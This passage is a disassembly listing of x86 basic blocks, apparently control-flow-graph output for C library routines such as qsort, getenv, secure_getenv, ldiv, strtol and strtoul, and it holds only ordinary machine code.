0xb0325f8:	mov	dword ptr [ebp - 0x4c], esi
0xb0325fb:	jae	0xb032804
None
|
|
|
v
0xb032631:	mov	esi, dword ptr [ebp + 0xc]
0xb032634:	lea	eax, dword ptr [ebp - 0x2c]
0xb032637:	mov	dword ptr [esp], esi
0xb03263a:	call	0xb032190
None
|
|
|
v
0xb032577:	xor	edx, edx
0xb032579:	mov	eax, esi
0xb03257b:	div	ecx
0xb03257d:	cmp	eax, dword ptr [ebx + 0x11b8]
0xb032583:	ja	0xb032700
None
|
|
|
v
0xb03263f:	mov	eax, dword ptr [ebp + 8]
0xb032642:	mov	dword ptr [ebp - 0x48], 0
0xb032649:	mov	dword ptr [ebp - 0x44], eax
0xb03264c:	lea	esi, dword ptr [esi]
0xb032650:	mov	ecx, dword ptr [ebp - 0x3c]
0xb032653:	mov	eax, dword ptr [ebp - 0x48]
0xb032656:	mov	esi, dword ptr [ebp - 0x44]
0xb032659:	mov	edi, dword ptr [ecx + eax*4]
0xb03265c:	cmp	edi, esi
0xb03265e:	je	0xb0326d4
None
|
|
|
v
0xb0327e9:	jmp	0xb0326ea
None
|
|
|
v
0xb032589:	mov	edi, dword ptr gs:[0]
0xb032590:	mov	eax, dword ptr [ebx - 0xdc]
0xb032596:	mov	edx, dword ptr [edi + eax]
0xb032599:	mov	dword ptr [esp], esi
0xb03259c:	mov	dword ptr [ebp - 0x3c], edx
0xb03259f:	call	0xb0173f0
None
|
|
|
v
0xb0326ea:	mov	eax, dword ptr [ebp - 0x50]
0xb0326ed:	mov	dword ptr [esp], eax
0xb0326f0:	call	0xb017470
None
|
|
|
v
0xb032608:	add	eax, 4
0xb03260b:	mov	dword ptr [eax - 4], edx
0xb03260e:	add	edx, edi
0xb032610:	cmp	esi, eax
0xb032612:	ja	0xb032608
None
|
|
|
v
0xb03273c:	cmp	dword ptr [ebp + 0x10], 4
0xb032740:	je	0xb03280c
None
|
|
|
v
0xb032619:	cmp	dword ptr [ebp + 0xc], 1
0xb03261d:	mov	dword ptr [ebp - 0x2c], 4
0xb032624:	mov	dword ptr [ebp - 0x28], 3
0xb03262b:	jbe	0xb0327de
None
|
|
|
v
0xb032746:	cmp	dword ptr [ebp + 0x10], 8
0xb03274a:	je	0xb0327ee
None
|
|
|
v
0xb03277a:	jmp	0xb0326f5
None
|
|
|
v
0xb032700:	mov	eax, dword ptr [ebp + 0x18]
0xb032703:	mov	dword ptr [esp + 0x10], eax
0xb032707:	mov	eax, dword ptr [ebp + 0x14]
0xb03270a:	mov	dword ptr [esp + 0xc], eax
0xb03270e:	mov	eax, dword ptr [ebp + 0x10]
0xb032711:	mov	dword ptr [esp + 8], eax
0xb032715:	mov	eax, dword ptr [ebp + 0xc]
0xb032718:	mov	dword ptr [esp + 4], eax
0xb03271c:	mov	eax, dword ptr [ebp + 8]
0xb03271f:	mov	dword ptr [esp], eax
0xb032722:	call	0xb031c50
None
|
|
|
v
0xb032567:	mov	eax, dword ptr [ebx + 0x11bc]
0xb03256d:	test	eax, eax
0xb03256f:	mov	ecx, eax
0xb032571:	je	0xb03279e
None
|
|
|
v
0xb0326bc:	mov	eax, dword ptr [ebp + 0x10]
0xb0326bf:	mov	dword ptr [edx], edi
0xb0326c1:	mov	dword ptr [esp], edi
0xb0326c4:	mov	dword ptr [esp + 8], eax
0xb0326c8:	mov	eax, dword ptr [ebp - 0x4c]
0xb0326cb:	mov	dword ptr [esp + 4], eax
0xb0326cf:	call	0xb07d0b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:qsort
TOTAL BLOCKS :2
0xb03284f:	add	esp, 0x2c
0xb032852:	ret	
None
|
|
|
v
0xb032820:	sub	esp, 0x2c
0xb032823:	mov	eax, dword ptr [esp + 0x3c]
0xb032827:	mov	dword ptr [esp + 0x10], 0
0xb03282f:	mov	dword ptr [esp + 0xc], eax
0xb032833:	mov	eax, dword ptr [esp + 0x38]
0xb032837:	mov	dword ptr [esp + 8], eax
0xb03283b:	mov	eax, dword ptr [esp + 0x34]
0xb03283f:	mov	dword ptr [esp + 4], eax
0xb032843:	mov	eax, dword ptr [esp + 0x30]
0xb032847:	mov	dword ptr [esp], eax
0xb03284a:	call	0xb032530
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getenv
TOTAL BLOCKS :20
0xb03289d:	cmp	byte ptr [edi + 1], 0
0xb0328a1:	je	0xb032908
None
|
|
|
v
0xb0328a3:	mov	eax, dword ptr [esp + 0x1c]
0xb0328a7:	add	edi, 2
0xb0328aa:	mov	esi, dword ptr [ebp]
0xb0328ad:	movzx	ecx, word ptr [edi - 2]
0xb0328b1:	sub	eax, 2
0xb0328b4:	test	esi, esi
0xb0328b6:	mov	dword ptr [esp + 0x14], eax
0xb0328ba:	je	0xb03292a
None
|
|
|
v
0xb0328f2:	test	eax, eax
0xb0328f4:	jne	0xb0328c8
None
|
|
|
v
0xb03292a:	add	esp, 0x2c
0xb03292d:	mov	eax, esi
0xb03292f:	pop	ebx
0xb032930:	pop	esi
0xb032931:	pop	edi
0xb032932:	pop	ebp
0xb032933:	ret	
None
|
|
|
v
0xb03287e:	mov	dword ptr [esp + 0x1c], eax
0xb032882:	mov	eax, dword ptr [ebx - 0xbc]
0xb032888:	mov	ebp, dword ptr [eax]
0xb03288a:	test	ebp, ebp
0xb03288c:	je	0xb032938
None
|
|
|
v
0xb0328d2:	cmp	di, word ptr [esi]
0xb0328d5:	jne	0xb0328c8
None
|
|
|
v
0xb032912:	jmp	0xb03292a
None
|
|
|
v
0xb032927:	add	esi, 2
0xb03292a:	add	esp, 0x2c
0xb03292d:	mov	eax, esi
0xb03292f:	pop	ebx
0xb032930:	pop	esi
0xb032931:	pop	edi
0xb032932:	pop	ebp
0xb032933:	ret	
None
|
|
|
v
0xb032908:	mov	esi, dword ptr [ebp]
0xb03290b:	or	ah, 0x3d
0xb03290e:	test	esi, esi
0xb032910:	jne	0xb032922
None
|
|
|
v
0xb0328f6:	mov	eax, dword ptr [esp + 0x1c]
0xb0328fa:	cmp	byte ptr [esi + eax], 0x3d
0xb0328fe:	jne	0xb0328c8
None
|
|
|
v
0xb032860:	push	ebp
0xb032861:	push	edi
0xb032862:	push	esi
0xb032863:	push	ebx
0xb032864:	sub	esp, 0x2c
0xb032867:	call	0xb1267db
None
|
|
|
v
0xb03286c:	add	ebx, 0x178794
0xb032872:	mov	edi, dword ptr [esp + 0x40]
0xb032876:	mov	dword ptr [esp], edi
0xb032879:	call	0xb07ae80
None
|
|
|
v
0xb0328c8:	add	ebp, 4
0xb0328cb:	mov	esi, dword ptr [ebp]
0xb0328ce:	test	esi, esi
0xb0328d0:	je	0xb03292a
None
|
|
|
v
0xb032938:	add	esp, 0x2c
0xb03293b:	xor	esi, esi
0xb03293d:	pop	ebx
0xb03293e:	mov	eax, esi
0xb032940:	pop	esi
0xb032941:	pop	edi
0xb032942:	pop	ebp
0xb032943:	ret	
None
|
|
|
v
0xb0328d7:	mov	eax, dword ptr [esp + 0x14]
0xb0328db:	mov	dword ptr [esp + 8], eax
0xb0328df:	mov	eax, dword ptr [esp + 0x18]
0xb0328e3:	mov	dword ptr [esp + 4], eax
0xb0328e7:	lea	eax, dword ptr [esi + 2]
0xb0328ea:	mov	dword ptr [esp], eax
0xb0328ed:	call	0xb082ed0
None
|
|
|
v
0xb032922:	cmp	ax, word ptr [esi]
0xb032925:	jne	0xb032918
None
|
|
|
v
0xb0328bc:	mov	dword ptr [esp + 0x18], edi
0xb0328c0:	mov	edi, ecx
0xb0328c2:	jmp	0xb0328d2
None
|
|
|
v
0xb032892:	movzx	eax, byte ptr [edi]
0xb032895:	test	al, al
0xb032897:	je	0xb032938
None
|
|
|
v
0xb032918:	add	ebp, 4
0xb03291b:	mov	esi, dword ptr [ebp]
0xb03291e:	test	esi, esi
0xb032920:	je	0xb03292a
None
|
|
|
v
0xb032900:	lea	esi, dword ptr [esi + eax + 1]
0xb032904:	jmp	0xb03292a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:secure_getenv
TOTAL BLOCKS :4
0xb033135:	add	ecx, 0x177ecb
0xb03313b:	mov	eax, dword ptr [ecx - 0x100]
0xb033141:	mov	eax, dword ptr [eax]
0xb033143:	test	eax, eax
0xb033145:	jne	0xb033150
None
|
|
|
v
0xb033150:	xor	eax, eax
0xb033152:	ret	
None
|
|
|
v
0xb033147:	jmp	0xb032860
None
|
|
|
v
0xb033130:	call	0xb1267df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ldiv
TOTAL BLOCKS :1
0xb033910:	mov	eax, dword ptr [esp + 8]
0xb033914:	mov	ecx, dword ptr [esp + 4]
0xb033918:	cdq	
0xb033919:	idiv	dword ptr [esp + 0xc]
0xb03391d:	mov	dword ptr [ecx], eax
0xb03391f:	mov	eax, ecx
0xb033921:	mov	dword ptr [ecx + 4], edx
0xb033924:	ret	4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strtol
TOTAL BLOCKS :3
0xb03464d:	add	ebx, 0x1769b3
0xb034653:	sub	esp, 0x28
0xb034656:	mov	eax, dword ptr [ebx - 0x134]
0xb03465c:	mov	eax, dword ptr [edx + eax]
0xb03465f:	mov	dword ptr [esp + 0xc], 0
0xb034667:	mov	dword ptr [esp + 0x10], eax
0xb03466b:	mov	eax, dword ptr [esp + 0x38]
0xb03466f:	mov	dword ptr [esp + 8], eax
0xb034673:	mov	eax, dword ptr [esp + 0x34]
0xb034677:	mov	dword ptr [esp + 4], eax
0xb03467b:	mov	eax, dword ptr [esp + 0x30]
0xb03467f:	mov	dword ptr [esp], eax
0xb034682:	call	0xb034870
None
|
|
|
v
0xb034687:	add	esp, 0x28
0xb03468a:	pop	ebx
0xb03468b:	ret	
None
|
|
|
v
0xb034640:	push	ebx
0xb034641:	mov	edx, dword ptr gs:[0]
0xb034648:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strtoul
TOTAL BLOCKS :3
0xb0346ed:	add	ebx, 0x176913
0xb0346f3:	sub	esp, 0x28
0xb0346f6:	mov	eax, dword ptr [ebx - 0x134]
0xb0346fc:	mov	eax, dword ptr [edx + eax]
0xb0346ff:	mov	dword ptr [esp + 0xc], 0
0xb034707:	mov	dword ptr [esp + 0x10], eax
0xb03470b:	mov	eax, dword ptr [esp + 0x38]
0xb03470f:	mov	dword ptr [esp + 8], eax
0xb034713:	mov	eax, dword ptr [esp + 0x34]
0xb034717:	mov	dword ptr [esp + 4], eax
0xb03471b:	mov	eax, dword ptr [esp + 0x30]
0xb03471f:	mov	dword ptr [esp], eax
0xb034722:	call	0xb034dc0
None
|
|
|
v
0xb034727:	add	esp, 0x28
0xb03472a:	pop	ebx
0xb03472b:	ret	
None
|
|
|
v
0xb0346e0:	push	ebx
0xb0346e1:	mov	edx, dword ptr gs:[0]
0xb0346e8:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b034870
TOTAL BLOCKS :97
0xb0349d0:	movzx	ecx, byte ptr [edx + 1]
0xb0349d4:	lea	eax, dword ptr [edx + 1]
0xb0349d7:	test	cl, cl
0xb0349d9:	je	0xb034a1d
None
|
|
|
v
0xb034ac2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb034cfc:	mov	edx, dword ptr [esp + 0x14]
0xb034d00:	movzx	edx, byte ptr [edx + eax]
0xb034d04:	cmp	byte ptr [edi + eax], dl
0xb034d07:	jne	0xb034d5c
None
|
|
|
v
0xb0349f7:	cmp	dword ptr [esp + 0x14], ebp
0xb0349fb:	jb	0xb034ac8
None
|
|
|
v
0xb034d26:	mov	ebp, dword ptr [esp + 0x20]
0xb034d2a:	mov	eax, dword ptr [esp + 0x14]
0xb034d2e:	mov	dword ptr [esp + 0xc], ecx
0xb034d32:	mov	dword ptr [esp + 8], edi
0xb034d36:	mov	dword ptr [esp], ebp
0xb034d39:	mov	dword ptr [esp + 4], eax
0xb034d3d:	call	0xb042c10
None
|
|
|
v
0xb034a29:	mov	eax, dword ptr [esp + 0x54]
0xb034a2d:	test	eax, eax
0xb034a2f:	je	0xb034a37
None
|
|
|
v
0xb034d7d:	jmp	0xb034d26
None
|
|
|
v
0xb034ce2:	mov	ebp, dword ptr [esp + 0x14]
0xb034ce6:	movzx	eax, byte ptr [esp + 0x26]
0xb034ceb:	cmp	byte ptr [ebp], al
0xb034cee:	jne	0xb034d65
None
|
|
|
v
0xb034b6b:	mov	eax, dword ptr [esp + 0x58]
0xb034b6f:	test	eax, eax
0xb034b71:	jne	0xb03492f
None
|
|
|
v
0xb0349e5:	mov	edx, eax
0xb0349e7:	lea	eax, dword ptr [ecx - 0x30]
0xb0349ea:	cmp	al, 9
0xb0349ec:	ja	0xb034998
None
|
|
|
v
0xb034c29:	mov	eax, dword ptr [ebx - 0xdc]
0xb034c2f:	mov	edx, dword ptr gs:[0]
0xb034c36:	mov	dword ptr [edx + eax], 0x22
0xb034c3d:	mov	eax, 0x7fffffff
0xb034c42:	jmp	0xb034a8e
None
|
|
|
v
0xb034b77:	mov	ecx, 0x30
0xb034b7c:	mov	eax, 6
0xb034b81:	mov	dword ptr [esp + 0x58], 8
0xb034b89:	jmp	0xb034946
None
|
|
|
v
0xb034c1a:	xor	eax, eax
0xb034c1c:	jmp	0xb034a8e
None
|
|
|
v
0xb0349a0:	movzx	eax, byte ptr [edx]
0xb0349a3:	cmp	byte ptr [edi], al
0xb0349a5:	jne	0xb034ae5
None
|
|
|
v
0xb034870:	push	ebp
0xb034871:	push	edi
0xb034872:	push	esi
0xb034873:	push	ebx
0xb034874:	sub	esp, 0x3c
0xb034877:	mov	edx, dword ptr [esp + 0x5c]
0xb03487b:	mov	eax, dword ptr [esp + 0x60]
0xb03487f:	call	0xb1267db
None
|
|
|
v
0xb034ab8:	cmp	al, byte ptr [esp + 0x27]
0xb034abc:	jbe	0xb034a0b
None
|
|
|
v
0xb034884:	add	ebx, 0x17677c
0xb03488a:	test	edx, edx
0xb03488c:	mov	eax, dword ptr [eax + 4]
0xb03488f:	jne	0xb034ca3
None
|
|
|
v
0xb034ca3:	mov	ecx, dword ptr [eax + 0x2c]
0xb034ca6:	movzx	edi, byte ptr [ecx]
0xb034ca9:	lea	edx, dword ptr [edi - 1]
0xb034cac:	cmp	dl, 0x7d
0xb034caf:	ja	0xb034895
None
|
|
|
v
0xb034bbf:	mov	eax, dword ptr [esp + 0x60]
0xb034bc3:	movsx	edx, byte ptr [edi - 1]
0xb034bc7:	mov	eax, dword ptr [eax + 0x3c]
0xb034bca:	cmp	dword ptr [eax + edx*4], 0x58
0xb034bce:	je	0xb034c02
None
|
|
|
v
0xb034cc1:	jmp	0xb034899
None
|
|
|
v
0xb034c0a:	mov	edi, dword ptr [esp + 0x54]
0xb034c0e:	sub	eax, 1
0xb034c11:	mov	dword ptr [edi], eax
0xb034c13:	xor	eax, eax
0xb034c15:	jmp	0xb034a8e
None
|
|
|
v
0xb034923:	mov	eax, dword ptr [esp + 0x58]
0xb034927:	test	eax, eax
0xb034929:	je	0xb034a96
None
|
|
|
v
0xb0348cf:	mov	edx, dword ptr [esp + 0x20]
0xb0348d3:	nop	
0xb0348d4:	lea	esi, dword ptr [esi]
0xb0348d8:	add	edx, 1
0xb0348db:	movzx	eax, byte ptr [edx]
0xb0348de:	movsx	esi, al
0xb0348e1:	test	byte ptr [ebp + esi*2 + 1], 0x20
0xb0348e6:	jne	0xb0348d8
None
|
|
|
v
0xb034c48:	add	esp, 0x3c
0xb034c4b:	mov	eax, ebp
0xb034c4d:	pop	ebx
0xb034c4e:	pop	esi
0xb034c4f:	pop	edi
0xb034c50:	pop	ebp
0xb034c51:	ret	
None
|
|
|
v
0xb034d5c:	movzx	edx, byte ptr [esp + 0x27]
0xb034d61:	mov	dword ptr [esp + 0x18], ebp
0xb034d65:	mov	eax, dword ptr [esp + 0x18]
0xb034d69:	test	byte ptr [eax + edx*2 + 1], 4
0xb034d6e:	je	0xb034d26
None
|
|
|
v
0xb034b10:	mov	eax, dword ptr [ebx - 0xdc]
0xb034b16:	mov	edx, dword ptr gs:[0]
0xb034b1d:	mov	dword ptr [edx + eax], 0x22
0xb034b24:	mov	edx, dword ptr [esp + 0x28]
0xb034b28:	mov	eax, 0x7fffffff
0xb034b2d:	test	edx, edx
0xb034b2f:	je	0xb034a8e
None
|
|
|
v
0xb0349cc:	add	edx, dword ptr [esp + 0x2c]
0xb0349d0:	movzx	ecx, byte ptr [edx + 1]
0xb0349d4:	lea	eax, dword ptr [edx + 1]
0xb0349d7:	test	cl, cl
0xb0349d9:	je	0xb034a1d
None
|
|
|
v
0xb034a43:	mov	esi, dword ptr [esp + 0x28]
0xb034a47:	test	esi, esi
0xb034a49:	je	0xb034c21
None
|
|
|
v
0xb034d65:	mov	eax, dword ptr [esp + 0x18]
0xb034d69:	test	byte ptr [eax + edx*2 + 1], 4
0xb034d6e:	je	0xb034d26
None
|
|
|
v
0xb034b8e:	add	dword ptr [esp + 0x20], 1
0xb034b93:	mov	dword ptr [esp + 0x28], 1
0xb034b9b:	jmp	0xb034910
None
|
|
|
v
0xb034c9e:	jmp	0xb034ba8
None
|
|
|
v
0xb034a01:	cmp	ebp, dword ptr [esp + 0x14]
0xb034a05:	je	0xb034ab8
None
|
|
|
v
0xb03496f:	mov	eax, dword ptr [esp + 0x20]
0xb034973:	cmp	dword ptr [esp + 0x18], eax
0xb034977:	je	0xb034ba8
None
|
|
|
v
0xb034cf0:	xor	eax, eax
0xb034cf2:	mov	ebp, dword ptr [esp + 0x18]
0xb034cf6:	mov	byte ptr [esp + 0x27], dl
0xb034cfa:	jmp	0xb034d09
None
|
|
|
v
0xb034ac8:	mov	dword ptr [esp + 0x1c], 1
0xb034ad0:	jmp	0xb0349d0
None
|
|
|
v
0xb0348f4:	cmp	al, 0x2d
0xb0348f6:	je	0xb034b8e
None
|
|
|
v
0xb034cc6:	movzx	edx, byte ptr [esp + 0x14]
0xb034ccb:	mov	eax, dword ptr [esp + 0x20]
0xb034ccf:	test	dl, dl
0xb034cd1:	mov	dword ptr [esp + 0x14], eax
0xb034cd5:	je	0xb034d26
None
|
|
|
v
0xb034d70:	mov	eax, dword ptr [esp + 0x60]
0xb034d74:	mov	eax, dword ptr [eax + 0x3c]
0xb034d77:	cmp	dword ptr [eax + edx*4], 0x40
0xb034d7b:	jle	0xb034d16
None
|
|
|
v
0xb034d42:	movzx	ecx, byte ptr [ebp]
0xb034d46:	mov	dword ptr [esp + 0x58], 0xa
0xb034d4e:	mov	dword ptr [esp + 0x18], eax
0xb034d52:	mov	eax, 8
0xb034d57:	jmp	0xb034950
None
|
|
|
v
0xb034b48:	test	dword ptr [esp + 0x58], 0xffffffef
0xb034b50:	jne	0xb03492f
None
|
|
|
v
0xb0348af:	mov	eax, dword ptr [esp + 0x60]
0xb0348b3:	mov	esi, dword ptr [esp + 0x50]
0xb0348b7:	mov	ebp, dword ptr [eax + 0x34]
0xb0348ba:	mov	eax, dword ptr [esp + 0x50]
0xb0348be:	mov	dword ptr [esp + 0x20], esi
0xb0348c2:	movzx	eax, byte ptr [eax]
0xb0348c5:	movsx	edx, al
0xb0348c8:	test	byte ptr [ebp + edx*2 + 1], 0x20
0xb0348cd:	je	0xb0348ec
None
|
|
|
v
0xb0349ee:	movzx	ecx, al
0xb0349f1:	cmp	ecx, dword ptr [esp + 0x58]
0xb0349f5:	jge	0xb034a1f
None
|
|
|
v
0xb034b56:	mov	eax, dword ptr [esp + 0x20]
0xb034b5a:	movsx	edx, byte ptr [eax + 1]
0xb034b5e:	mov	eax, dword ptr [esp + 0x60]
0xb034b62:	mov	eax, dword ptr [eax + 0x3c]
0xb034b65:	cmp	dword ptr [eax + edx*4], 0x58
0xb034b69:	je	0xb034be1
None
|
|
|
v
0xb034998:	test	esi, esi
0xb03499a:	je	0xb034ae5
None
|
|
|
v
0xb0349ab:	xor	eax, eax
0xb0349ad:	mov	byte ptr [esp + 0x26], cl
0xb0349b1:	jmp	0xb0349c5
None
|
|
|
v
0xb034c02:	cmp	byte ptr [edi - 2], 0x30
0xb034c06:	mov	eax, edi
0xb034c08:	jne	0xb034bd0
None
|
|
|
v
0xb034ae5:	mov	eax, dword ptr [esp + 0x60]
0xb034ae9:	mov	eax, dword ptr [eax + 0x34]
0xb034aec:	test	byte ptr [eax + ecx*2 + 1], 4
0xb034af1:	je	0xb034a1f
None
|
|
|
v
0xb034c21:	cmp	ebp, 0x7fffffff
0xb034c27:	jbe	0xb034c48
None
|
|
|
v
0xb034c88:	mov	edx, dword ptr [esp + 0x20]
0xb034c8c:	movzx	edx, byte ptr [edx + eax]
0xb034c90:	cmp	byte ptr [edi + eax], dl
0xb034c93:	jne	0xb034cc6
None
|
|
|
v
0xb03497d:	mov	edx, eax
0xb03497f:	xor	ebp, ebp
0xb034981:	lea	eax, dword ptr [esi - 1]
0xb034984:	mov	dword ptr [esp + 0x2c], eax
0xb034988:	lea	eax, dword ptr [ecx - 0x30]
0xb03498b:	cmp	al, 9
0xb03498d:	mov	dword ptr [esp + 0x1c], 0
0xb034995:	jbe	0xb0349ee
None
|
|
|
v
0xb034cb5:	mov	edi, dword ptr [eax + 0x28]
0xb034cb8:	cmp	byte ptr [edi], 0
0xb034cbb:	je	0xb034895
None
|
|
|
v
0xb034950:	mov	edx, dword ptr [ebx + eax*4 - 0x54520]
0xb034957:	test	cl, cl
0xb034959:	movzx	eax, byte ptr [ebx + eax - 0x54560]
0xb034961:	mov	dword ptr [esp + 0x14], edx
0xb034965:	mov	byte ptr [esp + 0x27], al
0xb034969:	je	0xb034ba8
None
|
|
|
v
0xb0348d8:	add	edx, 1
0xb0348db:	movzx	eax, byte ptr [edx]
0xb0348de:	movsx	esi, al
0xb0348e1:	test	byte ptr [ebp + esi*2 + 1], 0x20
0xb0348e6:	jne	0xb0348d8
None
|
|
|
v
0xb034ba0:	mov	eax, dword ptr [esp + 0x50]
0xb034ba4:	mov	dword ptr [esp + 0x20], eax
0xb034ba8:	mov	ecx, dword ptr [esp + 0x54]
0xb034bac:	test	ecx, ecx
0xb034bae:	je	0xb034c1a
None
|
|
|
v
0xb0349b8:	movzx	ecx, byte ptr [edx + eax]
0xb0349bc:	cmp	byte ptr [edi + eax], cl
0xb0349bf:	jne	0xb034ad8
None
|
|
|
v
0xb034d12:	mov	dword ptr [esp + 0x18], ebp
0xb034d16:	add	dword ptr [esp + 0x14], 1
0xb034d1b:	mov	eax, dword ptr [esp + 0x14]
0xb034d1f:	movzx	edx, byte ptr [eax]
0xb034d22:	test	dl, dl
0xb034d24:	jne	0xb034cdb
None
|
|
|
v
0xb034899:	cmp	dword ptr [esp + 0x58], 1
0xb03489e:	je	0xb034a78
None
|
|
|
v
0xb0348e8:	mov	dword ptr [esp + 0x20], edx
0xb0348ec:	test	al, al
0xb0348ee:	je	0xb034ba0
None
|
|
|
v
0xb034ad8:	cmp	esi, eax
0xb034ada:	movzx	ecx, byte ptr [esp + 0x26]
0xb034adf:	je	0xb0349cc
None
|
|
|
v
0xb034bb0:	mov	edi, dword ptr [esp + 0x20]
0xb034bb4:	mov	eax, edi
0xb034bb6:	sub	eax, dword ptr [esp + 0x50]
0xb034bba:	cmp	eax, 1
0xb034bbd:	jle	0xb034bd0
None
|
|
|
v
0xb034910:	mov	eax, dword ptr [esp + 0x20]
0xb034914:	movzx	eax, byte ptr [eax]
0xb034917:	cmp	al, 0x30
0xb034919:	mov	byte ptr [esp + 0x14], al
0xb03491d:	je	0xb034b48
None
|
|
|
v
0xb034a1f:	cmp	edx, dword ptr [esp + 0x20]
0xb034a23:	je	0xb034ba8
None
|
|
|
v
0xb0348ec:	test	al, al
0xb0348ee:	je	0xb034ba0
None
|
|
|
v
0xb034a4f:	mov	eax, ebp
0xb034a51:	neg	eax
0xb034a53:	cmp	ebp, 0x80000000
0xb034a59:	jbe	0xb034a8e
None
|
|
|
v
0xb034a78:	mov	eax, dword ptr [ebx - 0xdc]
0xb034a7e:	mov	edx, dword ptr gs:[0]
0xb034a85:	mov	dword ptr [edx + eax], 0x16
0xb034a8c:	xor	eax, eax
0xb034a8e:	add	esp, 0x3c
0xb034a91:	pop	ebx
0xb034a92:	pop	esi
0xb034a93:	pop	edi
0xb034a94:	pop	ebp
0xb034a95:	ret	
None
|
|
|
v
0xb034c52:	mov	dword ptr [esp], edi
0xb034c55:	mov	dword ptr [esp + 0x18], ecx
0xb034c59:	call	0xb07ae80
None
|
|
|
v
0xb034cd7:	mov	dword ptr [esp + 0x18], ebp
0xb034cdb:	lea	eax, dword ptr [edx - 0x30]
0xb034cde:	cmp	al, 9
0xb034ce0:	jbe	0xb034d16
None
|
|
|
v
0xb034a5b:	mov	eax, dword ptr [ebx - 0xdc]
0xb034a61:	mov	edx, dword ptr gs:[0]
0xb034a68:	mov	dword ptr [edx + eax], 0x22
0xb034a6f:	jmp	0xb034b35
None
|
|
|
v
0xb034d09:	add	eax, 1
0xb034d0c:	cmp	eax, dword ptr [esp + 0x1c]
0xb034d10:	jne	0xb034cfc
None
|
|
|
v
0xb034a96:	test	ecx, ecx
0xb034a98:	jne	0xb034c52
None
|
|
|
v
0xb034b35:	mov	eax, 0x80000000
0xb034b3a:	jmp	0xb034a8e
None
|
|
|
v
0xb0348a4:	cmp	dword ptr [esp + 0x58], 0x24
0xb0348a9:	ja	0xb034a78
None
|
|
|
v
0xb034a31:	mov	eax, dword ptr [esp + 0x54]
0xb034a35:	mov	dword ptr [eax], edx
0xb034a37:	mov	edi, dword ptr [esp + 0x1c]
0xb034a3b:	test	edi, edi
0xb034a3d:	jne	0xb034b10
None
|
|
|
v
0xb03493a:	mov	eax, dword ptr [esp + 0x58]
0xb03493e:	movzx	ecx, byte ptr [esp + 0x14]
0xb034943:	sub	eax, 2
0xb034946:	xor	esi, esi
0xb034948:	mov	dword ptr [esp + 0x18], 0
0xb034950:	mov	edx, dword ptr [ebx + eax*4 - 0x54520]
0xb034957:	test	cl, cl
0xb034959:	movzx	eax, byte ptr [ebx + eax - 0x54560]
0xb034961:	mov	dword ptr [esp + 0x14], edx
0xb034965:	mov	byte ptr [esp + 0x27], al
0xb034969:	je	0xb034ba8
None
|
|
|
v
0xb034c95:	add	eax, 1
0xb034c98:	cmp	eax, dword ptr [esp + 0x1c]
0xb034c9c:	jne	0xb034c88
None
|
|
|
v
0xb034ba8:	mov	ecx, dword ptr [esp + 0x54]
0xb034bac:	test	ecx, ecx
0xb034bae:	je	0xb034c1a
None
|
|
|
v
0xb034c6c:	movzx	eax, byte ptr [edi]
0xb034c6f:	cmp	byte ptr [esp + 0x14], al
0xb034c73:	mov	ecx, dword ptr [esp + 0x18]
0xb034c77:	mov	byte ptr [esp + 0x26], al
0xb034c7b:	jne	0xb034cc6
None
|
|
|
v
0xb034946:	xor	esi, esi
0xb034948:	mov	dword ptr [esp + 0x18], 0
0xb034950:	mov	edx, dword ptr [ebx + eax*4 - 0x54520]
0xb034957:	test	cl, cl
0xb034959:	movzx	eax, byte ptr [ebx + eax - 0x54560]
0xb034961:	mov	dword ptr [esp + 0x14], edx
0xb034965:	mov	byte ptr [esp + 0x27], al
0xb034969:	je	0xb034ba8
None
|
|
|
v
0xb034b3f:	mov	edx, dword ptr [esp + 0x18]
0xb034b43:	jmp	0xb034a29
None
|
|
|
v
0xb0349c5:	add	eax, 1
0xb0349c8:	cmp	eax, esi
0xb0349ca:	jne	0xb0349b8
None
|
|
|
v
0xb034a9e:	movzx	ecx, byte ptr [esp + 0x14]
0xb034aa3:	mov	eax, 8
0xb034aa8:	mov	dword ptr [esp + 0x58], 0xa
0xb034ab0:	jmp	0xb034946
None
|
|
|
v
0xb034d16:	add	dword ptr [esp + 0x14], 1
0xb034d1b:	mov	eax, dword ptr [esp + 0x14]
0xb034d1f:	movzx	edx, byte ptr [eax]
0xb034d22:	test	dl, dl
0xb034d24:	jne	0xb034cdb
None
|
|
|
v
0xb034cdb:	lea	eax, dword ptr [edx - 0x30]
0xb034cde:	cmp	al, 9
0xb034ce0:	jbe	0xb034d16
None
|
|
|
v
0xb034a1d:	mov	edx, eax
0xb034a1f:	cmp	edx, dword ptr [esp + 0x20]
0xb034a23:	je	0xb034ba8
None
|
|
|
v
0xb034a37:	mov	edi, dword ptr [esp + 0x1c]
0xb034a3b:	test	edi, edi
0xb034a3d:	jne	0xb034b10
None
|
|
|
v
0xb034a0b:	imul	ebp, dword ptr [esp + 0x58]
0xb034a10:	lea	eax, dword ptr [edx + 1]
0xb034a13:	add	ebp, ecx
0xb034a15:	movzx	ecx, byte ptr [edx + 1]
0xb034a19:	test	cl, cl
0xb034a1b:	jne	0xb0349db
None
|
|
|
v
0xb034be1:	mov	eax, dword ptr [esp + 0x20]
0xb034be5:	mov	dword ptr [esp + 0x58], 0x10
0xb034bed:	movzx	ecx, byte ptr [eax + 2]
0xb034bf1:	add	eax, 2
0xb034bf4:	mov	dword ptr [esp + 0x20], eax
0xb034bf8:	mov	eax, 0xe
0xb034bfd:	jmp	0xb034946
None
|
|
|
v
0xb034c5e:	test	eax, eax
0xb034c60:	mov	esi, eax
0xb034c62:	mov	dword ptr [esp + 0x1c], eax
0xb034c66:	je	0xb034ba8
None
|
|
|
v
0xb034997:	nop	
None
|
|
|
v
0xb0348fc:	cmp	al, 0x2b
0xb0348fe:	sete	al
0xb034901:	movzx	eax, al
0xb034904:	add	dword ptr [esp + 0x20], eax
0xb034908:	mov	dword ptr [esp + 0x28], 0
0xb034910:	mov	eax, dword ptr [esp + 0x20]
0xb034914:	movzx	eax, byte ptr [eax]
